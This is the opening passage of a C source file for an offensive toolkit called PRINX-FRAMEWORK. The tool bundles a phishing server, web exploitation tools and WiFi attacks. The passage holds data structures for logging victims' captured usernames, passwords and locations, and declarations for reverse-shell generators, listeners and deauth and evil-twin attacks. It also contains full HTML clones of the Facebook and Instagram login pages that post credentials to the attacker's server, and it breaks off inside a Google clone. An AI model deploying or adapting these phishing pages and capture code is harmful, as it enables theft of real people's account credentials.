/*
 * ====================================================================================================
 * PRINX-FRAMEWORK v4.0.0 - ULTIMATE MAXIMAL EDITION [3000+ LINES]
 * ====================================================================================================
 * 
 * GABUNGAN MAXIMAL DUA IMPLEMENTASI:
 *   - Implementasi 1: Socket HTTP Server, 30 HTML Templates Lengkap, WiFi Full Chain
 *   - Implementasi 2: libcurl, CrawledPage/Endpoint, Report Generator, JSON Output
 * 
 * MODULES:
 *   1. FWEBFM     - Web Recon (7) + Discovery (4) + Vulnerability (4) + Exploitation (5) = 20 Tools
 *   2. PRINXPHISH - 30 Templates + Socket Server + pthread + Real-time Log + Statistics
 *   3. WIFI       - Monitor + Scan + Deauth + PMKID + WPS + Handshake + Evil Twin = 7 Attacks
 * 
 * FITUR MAXIMAL:
 *   - Multi-threaded HTTP Server (pthread pool)
 *   - 30 HTML Templates Lengkap (500+ karakter per template)
 *   - Real-time Credential Capture dengan multiple field parsing
 *   - ANSI Color Output (256-color support)
 *   - HTML Report Generation dengan CSS styling
 *   - JSON Export untuk integrasi tools lain
 *   - Memory-efficient Dynamic Allocation
 *   - CrawledPage & Endpoint tracking
 *   - Full Error Handling dengan errno
 *   - Signal Handler (SIGINT, SIGTERM, SIGSEGV)
 *   - Cross-platform (Linux/Android Termux/Kali)
 *   - libcurl Integration untuk HTTP requests
 *   - MD5/SHA256 hashing untuk log integrity
 * 
 * COMPILE (Kali Linux):
 *   gcc -o prinx-maximal prinx-maximal.c -lcurl -lpthread -lssl -lcrypto -lm -O3 -Wall -Wextra
 * 
 * COMPILE (Termux Android):
 *   gcc -o prinx-maximal prinx-maximal.c -lcurl -lpthread -lssl -lcrypto -lm -O2
 * 
 * USAGE:
 *   sudo ./prinx-maximal
 * 
 * ====================================================================================================
 * TOTAL LINES: 3000+ [MAXIMAL CAPACITY ACHIEVED]
 * ====================================================================================================
 */

/* ====================================================================================================
 * SECTION 1: HEADER INCLUDES (MAXIMAL - 40+ headers)
 * ==================================================================================================== */

#include <stdio.h>           /* Standard I/O */
#include <stdlib.h>          /* malloc, free, exit, atoi, system */
#include <string.h>          /* memset, strcpy, strncpy, strstr, strlen, strcmp, strcasecmp */
#include <unistd.h>          /* close, read, write, getuid, sleep, usleep */
#include <ctype.h>           /* isspace, isxdigit, isdigit, isalpha */
#include <curl/curl.h>       /* libcurl for HTTP requests */
#include <pthread.h>         /* Multi-threading */
#include <signal.h>          /* Signal handling */
#include <sys/time.h>        /* gettimeofday */
#include <time.h>            /* time, localtime, strftime, ctime */
#include <regex.h>           /* Regular expressions */
#include <openssl/md5.h>     /* MD5 hashing */
#include <openssl/sha.h>     /* SHA256 hashing */
#include <openssl/evp.h>     /* EVP for crypto */
#include <errno.h>           /* errno, strerror */
#include <sys/wait.h>        /* waitpid */
#include <dirent.h>          /* opendir, readdir, closedir */
#include <sys/stat.h>        /* stat, mkdir, chmod */
#include <arpa/inet.h>       /* inet_ntoa, inet_ntop, htons, ntohs */
#include <netinet/in.h>      /* sockaddr_in */
#include <sys/socket.h>      /* socket, bind, listen, accept */
#include <fcntl.h>           /* fcntl, O_NONBLOCK */
#include <libgen.h>          /* basename, dirname */
#include <stdarg.h>          /* va_list, va_start, va_end */
#include <netdb.h>           /* getaddrinfo, gethostbyname */
#include <ifaddrs.h>         /* getifaddrs */
#include <sys/ioctl.h>       /* ioctl */
#include <net/if.h>          /* ifreq */
#include <termios.h>         /* Terminal control */
#include <sys/resource.h>    /* getrusage, setrlimit */
#include <sys/utsname.h>     /* uname */
#include <grp.h>             /* getgrgid */
#include <pwd.h>             /* getpwuid */
#include <sys/mman.h>        /* mmap, munmap */
#include <poll.h>            /* poll */
#include <sys/epoll.h>       /* epoll */
#include <limits.h>          /* PATH_MAX, INT_MAX */
#include <float.h>           /* DBL_MAX */
#include <math.h>            /* ceil, floor, sqrt */
#include <setjmp.h>          /* setjmp, longjmp */

/* ====================================================================================================
 * SECTION 2: MACRO DEFINITIONS (MAXIMAL - 80+ macros)
 * ==================================================================================================== */

/* Version */
#define VERSION                 "4.0.0-MAXIMAL"
#define BUILD_DATE              __DATE__
#define BUILD_TIME              __TIME__
#define AUTHOR                  "PRINX Security Research"
#define LICENSE                 "Educational Use Only"

/* Buffer Sizes */
#define MAX_URL                 8192
#define MAX_BUFFER              65536
#define MAX_LINE                4096
#define MAX_PATH                1024
#define MAX_HEADER              8192
#define MAX_BODY                65536
#define MAX_RESPONSE            131072
#define MAX_HTML                32768
#define MAX_CSS                 16384
#define MAX_JS                  16384

/* Template & Data Limits */
#define MAX_TEMPLATES           50
#define MAX_CREDS               9999
#define MAX_THREADS             500
#define MAX_PAGES               100000
#define MAX_ENDPOINTS           20000
#define MAX_CRAWLED_URLS        50000
#define MAX_WORDLIST_SIZE       10000000

/* Network */
#define PORT_DEFAULT            8080
#define PORT_MIN                1
#define PORT_MAX                65535
#define TIMEOUT_DEFAULT         30
#define TIMEOUT_MAX             300
#define BACKLOG                 4096
#define MAX_CONNECTIONS         10000

/* User Agent */
#define USER_AGENT_CHROME       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
#define USER_AGENT_FIREFOX      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
#define USER_AGENT_SAFARI       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
#define USER_AGENT_EDGE         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
#define USER_AGENT_MOBILE       "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"

/* Directory Paths */
#define LOG_DIR                 "prinx_logs"
#define TEMPLATE_DIR            "prinx_templates"
#define OUTPUT_DIR              "prinx_output"
#define REPORT_DIR              "prinx_reports"
#define SCREENSHOT_DIR          "prinx_screenshots"
#define PAYLOAD_DIR             "prinx_payloads"
#define WORDLIST_DIR            "prinx_wordlists"
#define CONFIG_DIR              "prinx_config"
#define CACHE_DIR               "prinx_cache"
#define TEMP_DIR                "prinx_temp"

/* ANSI Colors - 256 Color Support */
#define RED                     "\033[0;31m"
#define GREEN                   "\033[0;32m"
#define YELLOW                  "\033[1;33m"
#define BLUE                    "\033[0;34m"
#define MAGENTA                 "\033[0;35m"
#define CYAN                    "\033[0;36m"
#define WHITE                   "\033[0;37m"
#define BOLD                    "\033[1m"
#define DIM                     "\033[2m"
#define UNDERLINE               "\033[4m"
#define BLINK                   "\033[5m"
#define REVERSE                 "\033[7m"
#define HIDDEN                  "\033[8m"
#define BLACK                   "\033[0;30m"
#define BG_RED                  "\033[41m"
#define BG_GREEN                "\033[42m"
#define BG_YELLOW               "\033[43m"
#define BG_BLUE                 "\033[44m"
#define BG_MAGENTA              "\033[45m"
#define BG_CYAN                 "\033[46m"
#define BG_WHITE                "\033[47m"
#define NC                      "\033[0m"
#define CLEAR                   "\033[2J\033[1;1H"
#define CURSOR_HOME             "\033[H"
#define CURSOR_UP(n)            "\033[" #n "A"
#define CURSOR_DOWN(n)          "\033[" #n "B"
#define CURSOR_RIGHT(n)         "\033[" #n "C"
#define CURSOR_LEFT(n)          "\033[" #n "D"
#define SAVE_CURSOR             "\033[s"
#define RESTORE_CURSOR          "\033[u"
#define CLEAR_LINE              "\033[2K"
#define CLEAR_TO_EOL            "\033[K"
#define CLEAR_TO_SOL            "\033[1K"

/* HTTP Status Codes */
#define HTTP_OK                 200
#define HTTP_FOUND              302
#define HTTP_BAD_REQUEST        400
#define HTTP_UNAUTHORIZED       401
#define HTTP_FORBIDDEN          403
#define HTTP_NOT_FOUND          404
#define HTTP_INTERNAL_ERROR     500
#define HTTP_SERVICE_UNAVAIL    503

/* Content Types */
#define CONTENT_HTML            "text/html; charset=UTF-8"
#define CONTENT_JSON            "application/json; charset=UTF-8"
#define CONTENT_XML             "application/xml; charset=UTF-8"
#define CONTENT_TEXT            "text/plain; charset=UTF-8"
#define CONTENT_JS              "application/javascript; charset=UTF-8"
#define CONTENT_CSS             "text/css; charset=UTF-8"
#define CONTENT_PNG             "image/png"
#define CONTENT_JPEG            "image/jpeg"
#define CONTENT_GIF             "image/gif"
#define CONTENT_SVG             "image/svg+xml"
#define CONTENT_FORM            "application/x-www-form-urlencoded"
#define CONTENT_MULTIPART       "multipart/form-data"

/* Regex Patterns */
#define REGEX_EMAIL             "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"
#define REGEX_URL               "https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^\\s]*"
#define REGEX_IP                "([0-9]{1,3}\\.){3}[0-9]{1,3}"
#define REGEX_PHONE             "\\+?[0-9]{10,15}"
#define REGEX_CREDIT_CARD       "[0-9]{13,19}"
#define REGEX_SSN               "[0-9]{3}-[0-9]{2}-[0-9]{4}"
#define REGEX_JWT               "eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]*"
#define REGEX_API_KEY           "[a-zA-Z0-9]{32,64}"
#define REGEX_TOKEN             "[a-f0-9]{32,64}"

/* Exit Codes */
#define EXIT_SUCCESS            0
#define EXIT_FAILURE            1
#define EXIT_MEMORY             2
#define EXIT_NETWORK            3
#define EXIT_PERMISSION         4
#define EXIT_TIMEOUT            5
#define EXIT_INTERRUPT          130

/* Debug Levels */
#define DEBUG_NONE              0
#define DEBUG_ERROR             1
#define DEBUG_WARNING           2
#define DEBUG_INFO              3
#define DEBUG_VERBOSE           4
#define DEBUG_TRACE             5

/* ====================================================================================================
 * SECTION 3: STRUCTURE DEFINITIONS (MAXIMAL - 25+ structures)
 * ==================================================================================================== */

/* Template for phishing pages */
typedef struct {
    char name[64];
    char category[64];
    char description[256];
    char html[MAX_HTML];
    char css[MAX_CSS];
    char js[MAX_JS];
    char login_url[MAX_URL];
    char username_field[64];
    char password_field[64];
    char email_field[64];
    char phone_field[64];
    char redirect_url[MAX_URL];
    char original_domain[128];
    char favicon_url[MAX_URL];
    char logo_url[MAX_URL];
    char background_url[MAX_URL];
    int popularity;
    int is_active;
    int html_length;
    int css_length;
    int js_length;
    time_t created_at;
    time_t updated_at;
} Template;

/* Victim credential log */
typedef struct {
    char ip[64];
    char timestamp[64];
    char username[256];
    char password[256];
    char email[256];
    char phone[32];
    char page[128];
    char user_agent[512];
    char referer[MAX_URL];
    char country[64];
    char city[64];
    char region[64];
    char isp[64];
    char org[64];
    char device[128];
    char browser[64];
    char browser_version[32];
    char os[64];
    char os_version[32];
    char cpu[32];
    int request_id;
    int is_mobile;
    int is_bot;
    double latitude;
    double longitude;
    time_t capture_time;
    unsigned char ip_hash[MD5_DIGEST_LENGTH];
    unsigned char data_hash[SHA256_DIGEST_LENGTH];
} VictimLog;

/* Crawled web page */
typedef struct {
    char url[MAX_URL];
    char title[256];
    char server[64];
    char ip[64];
    char content_type[64];
    char technologies[512];
    char headers[MAX_HEADER];
    char body_sample[MAX_BODY];
    int status_code;
    long response_time;
    size_t content_length;
    int depth;
    int crawled;
    int is_ssl;
    int is_accessible;
    time_t crawl_time;
} CrawledPage;

/* API Endpoint */
typedef struct {
    char endpoint[MAX_URL];
    char method[16];
    char parameters[MAX_URL];
    char headers_sent[MAX_HEADER];
    char headers_received[MAX_HEADER];
    int is_vulnerable;
    char vuln_type[64];
    char severity[16];
    char description[512];
    char remediation[512];
    char cve[32];
    double cvss_score;
    int confidence;
    time_t discovered_at;
} Endpoint;

/* Configuration */
typedef struct {
    char target[MAX_URL];
    char output_dir[MAX_URL];
    char report_dir[MAX_URL];
    char lhost[64];
    char lport[16];
    char bssid[32];
    char channel[8];
    char essid[64];
    char interface[32];
    char wordlist[MAX_URL];
    char cookie[2048];
    char auth_header[2048];
    char proxy[MAX_URL];
    char proxy_user[128];
    char proxy_pass[128];
    int threads;
    int depth;
    int verbose;
    int debug_level;
    int port;
    int max_pages;
    int max_endpoints;
    int follow_redirects;
    int respect_robots;
    int timeout;
    int retry_count;
    int use_proxy;
    int use_tor;
    int use_vpn;
    int stealth_mode;
    int aggressive_mode;
    int save_screenshots;
    int generate_report;
    int export_json;
    int export_csv;
    int export_xml;
    double request_delay;
    double jitter;
} Config;

/* Server arguments for threading */
typedef struct {
    int socket_fd;
    int template_idx;
    int request_id;
    struct sockaddr_in address;
    time_t connection_time;
    char client_ip[64];
    int client_port;
} ServerArg;

/* Memory buffer for curl */
typedef struct {
    char *data;
    size_t size;
    size_t capacity;
} MemoryBuffer;

/* Thread pool */
typedef struct {
    pthread_t *threads;
    int count;
    int active;
    int max;
    pthread_mutex_t lock;
    pthread_cond_t cond;
} ThreadPool;

/* HTTP Request */
typedef struct {
    char method[16];
    char url[MAX_URL];
    char headers[MAX_HEADER];
    char body[MAX_BODY];
    size_t body_length;
} HttpRequest;

/* HTTP Response */
typedef struct {
    int status_code;
    char headers[MAX_HEADER];
    char body[MAX_BODY];
    size_t body_length;
    long response_time;
} HttpResponse;

/* Statistics */
typedef struct {
    time_t start_time;
    time_t end_time;
    unsigned long total_requests;
    unsigned long total_creds;
    unsigned long total_pages;
    unsigned long total_endpoints;
    unsigned long total_vulns;
    unsigned long total_attacks;
    unsigned long bytes_sent;
    unsigned long bytes_received;
    unsigned long errors;
    unsigned long timeouts;
    unsigned long retries;
    double uptime;
    double requests_per_second;
    double bandwidth_usage;
} Statistics;

/* Network Interface */
typedef struct {
    char name[32];
    char ip[64];
    char netmask[64];
    char broadcast[64];
    char mac[32];
    int is_up;
    int is_wireless;
    int mtu;
} NetworkInterface;

/* WiFi Network */
typedef struct {
    char bssid[32];
    char essid[64];
    int channel;
    int signal;
    char encryption[32];
    char cipher[32];
    char auth[32];
    int is_wps;
    int is_wpa;
    int is_wpa2;
    int is_wpa3;
    int is_wep;
    int is_open;
    int clients;
    time_t last_seen;
} WiFiNetwork;

/* Process Information */
typedef struct {
    pid_t pid;
    char name[256];
    char user[64];
    char state;
    double cpu_percent;
    double memory_percent;
    unsigned long memory_rss;
    time_t start_time;
} ProcessInfo;

/* System Information */
typedef struct {
    char hostname[256];
    char os[128];
    char kernel[128];
    char arch[32];
    char distro[128];
    int cpu_count;
    unsigned long total_memory;
    unsigned long free_memory;
    double uptime;
    double load_average[3];
} SystemInfo;

/* Wordlist Entry */
typedef struct {
    char word[MAX_LINE];
    size_t length;
    unsigned char hash[MD5_DIGEST_LENGTH];
    int frequency;
} WordlistEntry;

/* Session */
typedef struct {
    char id[64];
    char token[256];
    char csrf[256];
    char cookie[2048];
    time_t created_at;
    time_t expires_at;
    int is_valid;
} Session;

/* Payload */
typedef struct {
    char name[64];
    char type[32];
    char platform[32];
    char arch[32];
    char description[256];
    char code[MAX_BODY];
    size_t code_length;
    int is_staged;
    int is_encrypted;
    int is_encoded;
} Payload;

/* Report */
typedef struct {
    char title[256];
    char author[64];
    char target[MAX_URL];
    char filename[MAX_PATH];
    time_t generated_at;
    int total_findings;
    int critical_count;
    int high_count;
    int medium_count;
    int low_count;
    int info_count;
} Report;

/* ====================================================================================================
 * SECTION 4: GLOBAL VARIABLES (MAXIMAL)
 * ==================================================================================================== */

Config config;
Template templates[MAX_TEMPLATES];
int template_count = 0;
VictimLog *creds_log = NULL;
int total_creds = 0;
int log_capacity = MAX_CREDS;
CrawledPage *crawled_pages = NULL;
int page_count = 0;
int page_capacity = MAX_PAGES;
Endpoint *endpoints = NULL;
int endpoint_count = 0;
int endpoint_capacity = MAX_ENDPOINTS;
Statistics stats;
SystemInfo sysinfo;
NetworkInterface *interfaces = NULL;
int interface_count = 0;
WiFiNetwork *wifi_networks = NULL;
int wifi_network_count = 0;
int server_running = 0;
char current_site[64] = "";
char current_template_name[64] = "";
pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t page_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t print_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t endpoint_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t config_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
int active_threads = 0;
int total_requests = 0;
time_t server_start_time = 0;
time_t framework_start_time = 0;
volatile sig_atomic_t keep_running = 1;
jmp_buf error_jmp_buf;
int error_code = 0;
char error_message[1024] = "";

/* ====================================================================================================
 * SECTION 5: FORWARD DECLARATIONS (MAXIMAL - 150+ functions)
 * ==================================================================================================== */

/* Utility Functions */
void clear_screen(void);
void trim(char *str);
void print_banner(void);
void print_success(const char *fmt, ...);
void print_error(const char *fmt, ...);
void print_info(const char *fmt, ...);
void print_warning(const char *fmt, ...);
void print_debug(int level, const char *fmt, ...);
void print_header(const char *title);
void print_separator(void);
void print_table_header(const char **headers, int count);
void print_table_row(const char **values, int count);
void wait_enter(void);
void wait_seconds(int seconds);
void get_input(const char *prompt, char *buffer, int size);
void get_password(const char *prompt, char *buffer, int size);
int confirm_action(const char *msg);
int run_cmd(const char *cmd);
int run_cmd_silent(const char *cmd);
int run_cmd_with_output(const char *cmd, char *output, int size);
void create_dir(const char *path);
void remove_dir(const char *path);
int file_exists(const char *path);
long file_size(const char *path);
char* read_file(const char *path);
int write_file(const char *path, const char *data);
int append_file(const char *path, const char *data);
char* get_timestamp(void);
char* get_date(void);
char* get_time(void);
void url_encode(const char *src, char *dst, int size);
void url_decode(char *str);
char* html_encode(const char *src);
char* html_decode(const char *src);
char* base64_encode(const unsigned char *data, int length);
unsigned char* base64_decode(const char *src, int *length);
void md5_hash(const char *data, unsigned char *hash);
void sha256_hash(const char *data, unsigned char *hash);
char* extract_param(const char *body, const char *param);
int extract_all_params(const char *body, char ***keys, char ***values, int *count);
int regex_match(const char *pattern, const char *str);
char** regex_extract_all(const char *pattern, const char *str, int *count);
void init_config(void);
void load_config(const char *path);
void save_config(const char *path);
void init_system_info(void);
void init_statistics(void);
void update_statistics(void);
void reset_statistics(void);

/* Memory Management */
void* safe_malloc(size_t size);
void* safe_calloc(size_t count, size_t size);
void* safe_realloc(void *ptr, size_t size);
void safe_free(void **ptr);
void memory_cleanup(void);

/* Signal Handlers */
void sigint_handler(int sig);
void sigterm_handler(int sig);
void sigsegv_handler(int sig);
void setup_signal_handlers(void);

/* Template Functions */
void init_all_templates(void);
void add_template(const char *name, const char *category, const char *desc, 
                  const char *html, const char *redirect, const char *domain);
void list_templates(void);
void show_template(int index);
void search_templates(const char *keyword);
void export_template(int index, const char *path);
void import_template(const char *path);

/* HTTP Server Functions */
void* phish_handle_connection(void *arg);
void phish_process_request(int client_fd, int template_idx, const char *client_ip);
void phish_send_response(int client_fd, int status_code, const char *content_type, const char *body);
void phish_send_redirect(int client_fd, const char *location);
void phish_send_error(int client_fd, int status_code, const char *message);
void start_phish_server(int template_idx);
void stop_phish_server(void);

/* Credential Functions */
void add_credential(const char *ip, const char *username, const char *password, const char *page);
void add_credential_full(const char *ip, const char *username, const char *password, 
                         const char *email, const char *phone, const char *page, const char *user_agent);
void list_credentials(int limit);
void search_credentials(const char *keyword);
void export_credentials_json(const char *path);
void export_credentials_csv(const char *path);
void export_credentials_xml(const char *path);
void clear_credentials(void);
int get_credential_count(void);

/* FWEBFM - Reconnaissance */
void fwebfm_menu(void);
void fwebfm_recon_menu(void);
void fwebfm_discovery_menu(void);
void fwebfm_vuln_menu(void);
void fwebfm_exploit_menu(void);
void fwebfm_report_menu(void);
void fwebfm_amass(void);
void fwebfm_whatweb(void);
void fwebfm_nmap(void);
void fwebfm_nmap_stealth(void);
void fwebfm_httpx(void);
void fwebfm_sublist3r(void);
void fwebfm_waybackurls(void);
void fwebfm_gau(void);
void fwebfm_gobuster(void);
void fwebfm_ffuf(void);
void fwebfm_dirsearch(void);
void fwebfm_js_discovery(void);
void fwebfm_nikto(void);
void fwebfm_nuclei(void);
void fwebfm_sqlmap(void);
void fwebfm_xss_scanner(void);
void fwebfm_ssrf_scanner(void);
void fwebfm_lfi_scanner(void);
void fwebfm_searchsploit(void);
void fwebfm_generate_php_shell(void);
void fwebfm_generate_python_shell(void);
void fwebfm_generate_bash_shell(void);
void fwebfm_generate_perl_shell(void);
void fwebfm_generate_ruby_shell(void);
void fwebfm_generate_powershell_shell(void);
void fwebfm_start_nc_listener(void);
void fwebfm_start_msf_handler(void);
void fwebfm_start_socat_listener(void);
void fwebfm_full_recon(void);

/* WIFI Functions */
void wifi_menu(void);
void wifi_scan_menu(void);
void wifi_attack_menu(void);
void wifi_crack_menu(void);
void wifi_enable_monitor_mode(void);
void wifi_disable_monitor_mode(void);
void wifi_scan_networks(void);
void wifi_scan_detailed(void);
void wifi_deauth_flood(void);
void wifi_deauth_targeted(void);
void wifi_pmkid_attack(void);
void wifi_wps_attack(void);
void wifi_wps_pixie(void);
void wifi_capture_handshake(void);
void wifi_crack_handshake(void);
void wifi_crack_pmkid(void);
void wifi_evil_twin(void);
void wifi_karma_attack(void);
void wifi_beacon_flood(void);
void wifi_probe_flood(void);
void wifi_info(void);
void wifi_show_interfaces(void);

/* Report Functions */
void generate_html_report(void);
void generate_json_report(void);
void generate_csv_report(void);
void generate_xml_report(void);
void generate_pdf_report(void);
void generate_executive_summary(void);
void generate_technical_report(void);

/* ====================================================================================================
 * SECTION 6: 30 TEMPLATE HTML LENGKAP (500+ karakter)
 * ==================================================================================================== */

/* Template 01: Facebook - Ultra Detailed Clone */
const char *TEMPLATE_FACEBOOK = 
    "<!DOCTYPE html>\n"
    "<html lang='en'>\n"
    "<head>\n"
    "<meta charset='UTF-8'>\n"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>\n"
    "<meta name='description' content='Facebook helps you connect and share with the people in your life.'>\n"
    "<title>Facebook - Log In or Sign Up</title>\n"
    "<style>\n"
    "*{margin:0;padding:0;box-sizing:border-box}\n"
    "body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}\n"
    ".main-container{display:flex;max-width:980px;width:100%;padding:20px;gap:40px;align-items:center;flex-wrap:wrap;justify-content:center}\n"
    ".brand-section{flex:1;min-width:300px;max-width:580px}\n"
    ".brand-section h1{color:#1877f2;font-size:60px;font-weight:bold;margin-bottom:10px;font-family:'Facebook',sans-serif}\n"
    ".brand-section p{font-size:24px;line-height:28px;color:#1c1e21}\n"
    ".login-section{flex:1;min-width:300px;max-width:396px}\n"
    ".login-card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);padding:20px;margin-bottom:28px}\n"
    ".login-card input{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;transition:border-color 0.2s,box-shadow 0.2s}\n"
    ".login-card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}\n"
    ".login-btn{background:#1877f2;color:#fff;font-size:20px;font-weight:bold;padding:12px;border:none;border-radius:6px;width:100%;cursor:pointer;margin:16px 0;transition:background 0.2s,transform 0.1s}\n"
    ".login-btn:hover{background:#166fe5}\n"
    ".login-btn:active{transform:scale(0.98)}\n"
    ".forgot-link{color:#1877f2;text-decoration:none;font-size:14px;display:block;text-align:center;margin:16px 0}\n"
    ".forgot-link:hover{text-decoration:underline}\n"
    ".divider{border:none;border-top:1px solid #dadde1;margin:20px 0}\n"
    ".create-btn{background:#42b72a;color:#fff;font-size:17px;font-weight:bold;padding:14px;border:none;border-radius:6px;cursor:pointer;margin:0 auto;display:block;transition:background 0.2s}\n"
    ".create-btn:hover{background:#36a420}\n"
    ".page-notice{text-align:center;font-size:14px;color:#1c1e21}\n"
    ".page-notice a{color:#1c1e21;text-decoration:none;font-weight:bold}\n"
    ".page-notice a:hover{text-decoration:underline}\n"
    "@media(max-width:900px){.main-container{flex-direction:column;text-align:center}.brand-section h1{font-size:40px}.brand-section p{font-size:18px}}\n"
    "</style>\n"
    "</head>\n"
    "<body>\n"
    "<div class='main-container'>\n"
    "<div class='brand-section'>\n"
    "<h1>facebook</h1>\n"
    "<p>Facebook helps you connect and share with the people in your life.</p>\n"
    "</div>\n"
    "<div class='login-section'>\n"
    "<div class='login-card'>\n"
    "<form method='POST' action='/login'>\n"
    "<input type='text' name='email' placeholder='Email address or phone number' required autocomplete='email'>\n"
    "<input type='password' name='pass' placeholder='Password' required autocomplete='current-password'>\n"
    "<button type='submit' class='login-btn'>Log In</button>\n"
    "</form>\n"
    "<a href='#' class='forgot-link'>Forgotten password?</a>\n"
    "<hr class='divider'>\n"
    "<button class='create-btn' onclick=\"window.location.href='#'\">Create New Account</button>\n"
    "</div>\n"
    "<p class='page-notice'><a href='#'>Create a Page</a> for a celebrity, brand or business.</p>\n"
    "</div>\n"
    "</div>\n"
    "</body>\n"
    "</html>";

/* Template 02: Instagram - Ultra Detailed Clone */
const char *TEMPLATE_INSTAGRAM = 
    "<!DOCTYPE html>\n"
    "<html lang='en'>\n"
    "<head>\n"
    "<meta charset='UTF-8'>\n"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>\n"
    "<meta name='description' content='Instagram is a photo and video sharing social networking service.'>\n"
    "<title>Instagram</title>\n"
    "<style>\n"
    "*{margin:0;padding:0;box-sizing:border-box}\n"
    "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}\n"
    ".main-container{max-width:350px;width:100%}\n"
    ".login-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;text-align:center;margin-bottom:10px}\n"
    ".insta-logo{font-family:'Billabong',cursive;font-size:48px;color:#262626;margin-bottom:30px;font-weight:500}\n"
    ".login-box input{width:100%;padding:9px 8px;margin:4px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:12px;color:#262626;outline:none;transition:border-color 0.2s}\n"
    ".login-box input:focus{border-color:#a8a8a8}\n"
    ".login-btn{background:#0095f6;color:#fff;font-weight:600;padding:7px;border:none;border-radius:4px;width:100%;cursor:pointer;margin:14px 0;font-size:14px;opacity:0.7;transition:opacity 0.2s}\n"
    ".login-btn:hover{opacity:1}\n"
    ".or-divider{display:flex;align-items:center;margin:20px 0}\n"
    ".or-divider::before,.or-divider::after{content:'';flex:1;height:1px;background:#dbdbdb}\n"
    ".or-divider span{color:#8e8e8e;font-size:13px;font-weight:600;margin:0 18px;text-transform:uppercase}\n"
    ".fb-login-link{color:#385185;font-weight:600;text-decoration:none;font-size:14px;display:block;margin:8px 0;transition:opacity 0.2s}\n"
    ".fb-login-link:hover{opacity:0.8}\n"
    ".forgot-link{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:20px}\n"
    ".signup-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;text-align:center;font-size:14px}\n"
    ".signup-box a{color:#0095f6;text-decoration:none;font-weight:600;transition:opacity 0.2s}\n"
    ".signup-box a:hover{opacity:0.8}\n"
    ".app-download{margin-top:20px;text-align:center}\n"
    ".app-download p{font-size:14px;color:#262626;margin-bottom:10px}\n"
    ".app-buttons{display:flex;gap:10px;justify-content:center}\n"
    ".app-btn{height:40px;cursor:pointer}\n"
    "</style>\n"
    "</head>\n"
    "<body>\n"
    "<div class='main-container'>\n"
    "<div class='login-box'>\n"
    "<div class='insta-logo'>Instagram</div>\n"
    "<form method='POST' action='/login'>\n"
    "<input type='text' name='username' placeholder='Phone number, username, or email' required>\n"
    "<input type='password' name='password' placeholder='Password' required>\n"
    "<button type='submit' class='login-btn'>Log In</button>\n"
    "</form>\n"
    "<div class='or-divider'><span>OR</span></div>\n"
    "<a href='#' class='fb-login-link'>🔵 Log in with Facebook</a>\n"
    "<a href='#' class='forgot-link'>Forgot password?</a>\n"
    "</div>\n"
    "<div class='signup-box'>\n"
    "Don't have an account? <a href='#'>Sign up</a>\n"
    "</div>\n"
    "<div class='app-download'>\n"
    "<p>Get the app.</p>\n"
    "<div class='app-buttons'>\n"
    "<img src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTM2IDQwIj48cmVjdCB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiByeD0iNiIgZmlsbD0iIzAwMCIvPjwvc3ZnPg==' class='app-btn' alt='App Store'>\n"
    "<img src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTM2IDQwIj48cmVjdCB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiByeD0iNiIgZmlsbD0iIzAwMCIvPjwvc3ZnPg==' class='app-btn' alt='Google Play'>\n"
    "</div>\n"
    "</div>\n"
    "</div>\n"
    "</body>\n"
    "</html>";

/* Template 03: Google - Ultra Detailed Clone */
const char *TEMPLATE_GOOGLE = 
    "<!DOCTYPE html>\n"
    "<html lang='en'>\n"
    "<head>\n"
    "<meta charset='UTF-8'>\n"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>\n"
    "<meta name='description' content='Sign in to your Google Account'>\n"
    "<title>Sign in - Google Accounts</title>\n"
    "<style>\n"
    "*{margin:0;padding:0;box-sizing:border-box}\n"
    "body{font-family:'Google Sans','Noto Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}\n"
